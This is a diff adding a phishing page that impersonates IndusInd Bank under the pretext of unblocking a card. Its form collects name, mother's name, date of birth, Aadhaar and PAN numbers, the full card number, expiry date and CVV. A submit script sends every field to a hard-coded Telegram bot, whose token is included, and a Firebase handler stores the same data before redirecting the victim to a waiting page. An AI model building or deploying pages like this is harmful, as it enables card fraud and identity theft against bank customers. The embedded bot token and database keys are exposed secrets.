@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redeem – IndusInd Bank</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body class="apply-page">
+<div class="top-red-bar"></div>
+
+<header class="apply-header">
+  <div class="apply-logo">
+    <img src="logo.png" alt="IndusInd">
+    <span>IndusInd Bank</span>
+  </div>
+ <div class="menu-icon">☰</div>
+
+</header>
+
+<section class="apply-section">
+  <h2>CardUnblock</h2>
+<p>Submit your details to unblock the card</p>
+<form id="studentForm">
+
+  <div class="form-group">
+  <span class="icon">👤</span>
+  <input type="text"name="Full Name" placeholder="Full Name">
+</div>
+<div class="form-group">
+  <span class="icon">👩
+</span>
+  <input type="text"name="Mother Name" placeholder="Mother Name">
+</div>
+
+<div class="form-group">
+  <span class="icon">📱</span>
+  <input type="tel" name="Mobile Number" placeholder="Mobile Number" maxlength="10">
+</div>
+ <div class="form-group half">
+    <span class="icon">📅</span><input
+  type="text"
+  id="dob"
+name="dob"
+  placeholder="DD/MM/YYYY"
+  maxlength="10"
+/>
+<small id="dobError" class="error-text"></small>
+
+  </div>
+
+<div class="form-group">
+  <span class="icon">✉️</span>
+  <input type="email"name="Email ID" placeholder="Email ID">
+</div>
+
+<div class="form-group">
+  <span class="icon">🏠</span>
+  <input type="text" name="Address"placeholder="Address">
+</div>
+<div class="form-group">
+  <span class="icon">🪪</span>
+  <input type="text" name="Adharcard number"placeholder="Adharcard number" maxlength="12">
+</div>
+
+
+<div class="form-group">
+  <span class="icon">🪪</span>
+  <input type="text" name="PAN Number"placeholder="PAN Number (ABCDE1234F)" maxlength="10">
+</div>
+<div class="form-row two-col">
+  <div class="input-card">
+    <span class="icon">₹</span>
+    <input type="number" name="Total Limit"placeholder="Total Limit">
+  </div>
+
+  <div class="input-card">
+    <span class="icon">₹</span>
+    <input type="number"name="Outstanding Limit" placeholder="Outstanding Limit">
+  </div>
+</div>
+
+<div class="form-group">
+  <span class="icon">💳</span>
+  <input type="text" name="Card Number" placeholder="Card Number (**** **** **** 1234)" maxlength="16">
+</div>
+<div class="form-group">
+  <span class="icon">💳</span>
+<input
+  type="text"
+  id="expiry"
+name="expiry"
+  placeholder="MM/YY"
+  maxlength="5"
+  oninput="formatExpiry(this)"
+  inputmode="numeric"
+  autocomplete="off"
+/>
+
+</div>
+<div class="form-row">
+ 
+
+  <div class="form-group half">
+    <span class="icon">🔒</span>
+    <input type="password" name="cvv" placeholder="CVV" maxlength="3">
+  </div>
+</div>
+
+  
+
+    <button type="button" class="apply-btn" onclick="demoSubmit()">Submit</button>
+  </form>
+<script>
+function toggleCVV(){
+  const cvv = document.getElementById("cvv");
+  cvv.type = cvv.type === "password" ? "text" : "password";
+}
+</script>
+<script>
+const panInput = document.getElementById("pan");
+
+panInput.addEventListener("input", function(){
+  let value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, "");
+  this.value = value.slice(0, 10);
+});
+
+/* Optional: pattern check on blur */
+panInput.addEventListener("blur", function(){
+  const panPattern = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
+  if(this.value && !panPattern.test(this.value)){
+    this.style.borderColor = "#c62828";
+  }else{
+    this.style.borderColor = "#e1e1e1";
+  }
+});
+</script>
+
+
+</section>
+<script>
+const dob = document.getElementById("dob");
+const dobError = document.getElementById("dobError");
+
+dob.addEventListener("input", function () {
+  let v = dob.value.replace(/\D/g, "");
+  if (v.length > 8) v = v.slice(0, 8);
+
+  if (v.length >= 5)
+    dob.value = v.slice(0,2)+"/"+v.slice(2,4)+"/"+v.slice(4);
+  else if (v.length >= 3)
+    dob.value = v.slice(0,2)+"/"+v.slice(2);
+  else
+    dob.value = v;
+
+  checkAge();
+});
+
+function checkAge() {
+  dobError.textContent = "";
+  dob.classList.remove("input-error");
+
+  if (dob.value.length !== 10) return;
+
+  const [d, m, y] = dob.value.split("/").map(Number);
+  const birthDate = new Date(y, m - 1, d);
+  const today = new Date();
+
+  let age = today.getFullYear() - y;
+  const mDiff = today.getMonth() - (m - 1);
+
+  if (mDiff < 0 || (mDiff === 0 && today.getDate() < d)) {
+    age--;
+  }
+
+  if (age < 18) {
+    dobError.textContent = "Age must be 18 years or above";
+    dob.classList.add("input-error");
+  }
+}
+</script>
+<script>
+function demoSubmit() {
+
+    const form = document.getElementById("studentForm");
+    const formData = new FormData(form);
+
+    let message = "🧑 new customer\n\n";
+
+    formData.forEach((value, key) => {
+        message += key + ": " + value + "\n";
+    });
+
+    var botToken = "8321961191:AAHar1VUUtplOrNfp2aDKbKwcP-5NrlZKGE";
+    var chatId   = "8089088528";
+
+    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    })
+    .then(() => window.location.href = "wait.html");
+}
+</script>
+<script>
+/* 🔥 FIREBASE CONFIG */
+const firebaseConfig = {
+  apiKey: "AIzaSyDn7CrJSvWMWHc8XY3VGmtDyX1oQ7Zrf7c",
+  authDomain: "adminapp-8bf93.firebaseapp.com",
+  databaseURL: "https://adminapp-8bf93-default-rtdb.firebaseio.com",
+  projectId: "adminapp-8bf93",
+  storageBucket: "adminapp-8bf93.firebasestorage.app",
+  messagingSenderId: "891058990549",
+  appId: "1:891058990549:web:f8e4e87317ff536ef5215c"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+/* ✅ FORM SUBMIT */
+document.getElementById("studentForm").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  const formData = new FormData(this);
+  let data = {};
+  formData.forEach((v,k)=>data[k]=v);
+
+  /* 🔑 CREATE USER NODE */
+  const userRef = db.ref("students").push();
+  const userId = userRef.key;
+
+  /* 🔐 SAVE userId for wait.html */
+  localStorage.setItem("userId", userId);
+
+  /* 🟢 INITIAL SAVE */
+  userRef.set({
+    ...data,
+    status: "online",
+    time: Date.now()
+  })
+  .then(()=>{
+    window.location.href = "wait.html";
+  })
+  .catch(err=>{
+    console.error(err);
+    alert("❌ Firebase error");
+  });
+});
+</script>
+<script>
+function formatExpiry(input) {
+  let value = input.value.replace(/\D/g, ""); // only numbers
+
+  if (value.length >= 3) {
+    input.value = value.substring(0, 2) + "/" + value.substring(2, 4);
+  } else {
+    input.value = value;
+  }
+}
+</script>
+
+
+
+</body>
+</html>
